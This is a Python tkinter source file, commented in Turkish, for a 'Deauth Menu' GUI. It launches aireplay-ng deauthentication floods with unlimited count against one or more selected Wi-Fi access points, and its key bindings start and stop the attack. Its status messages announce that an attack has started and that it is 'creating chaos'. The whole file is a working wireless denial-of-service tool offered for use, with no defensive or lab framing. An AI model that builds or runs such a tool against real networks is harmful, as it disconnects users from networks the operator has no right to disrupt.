import tkinter as tk
import subprocess
import os
from PIL import Image, ImageTk

# Global değişkenler
state = False
root = None
label = None

def deauth(apmac, device):
    global label
    if not apmac:
        label.config(text="Lütfen ağ seçiniz", bg="black", fg="white")
    elif isinstance(apmac, list) and len(apmac) > 1:
        for mac in apmac:
            komut = f"aireplay-ng --deauth 0 -a {mac} {device}"
            subprocess.Popen(["xfce4-terminal", "--command", komut])
        label.config(text="Kaos çıkartılıyor")
    else:
        subprocess.Popen(["xfce4-terminal", "--command", f"aireplay-ng --deauth 0 -a {apmac} {device}"])
        label.config(text="Kaos çıkartılıyor")

def close(event):
    global root
    os.system("pkill -f 'aireplay-ng --deauth'")
    os.system("pkill xfce4-terminal")
    if root:
        root.destroy()

def pause(event):
    global label
    os.system("pkill -f 'aireplay-ng --deauth'")
    os.system("pkill xfce4-terminal")
    label.config(text="Durduruldu")

def check(event, apmac, device):
    global state, label
    if not state:
        deauth(apmac, device)
        label.config(text="Saldırı başlatıldı")
        state = True
    else:
        os.system("pkill -f 'aireplay-ng --deauth'")
        os.system("pkill xfce4-terminal")
        label.config(text="Durduruldu")
        state = False

def dea(apmac, device):
    global root, label, state
    root = tk.Tk()
    root.geometry("480x320")
    root.title("Deauth Menu")

    label = tk.Label(root, text="Hazır", font=("Arial", 20), bg="black", fg="white")
    label.pack(pady=10, fill="both", padx=20)

    base_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
    image_path = os.path.join(base_dir, "images", "BADBMMOO.png")

    try:
        image = Image.open(image_path)
        image = image.resize((480, 320), Image.Resampling.LANCZOS)
        global_resim = ImageTk.PhotoImage(image)

        img_label = tk.Label(root, image=global_resim)
        img_label.place(x=0, y=0, relwidth=1, relheight=1)
        img_label.image = global_resim  # ImageTk nesnesi garbage collection tarafından silinmesin diye
    except FileNotFoundError:
        print(f"Hata: '{image_path}' bulunamadı.")

    root.bind("<a>", lambda event: check(event, apmac, device))
    root.bind("<w>", lambda event: check(event, apmac, device))
    root.bind("<Return>", lambda event: check(event, apmac, device))
    root.bind("<d>", close)

    root.mainloop()
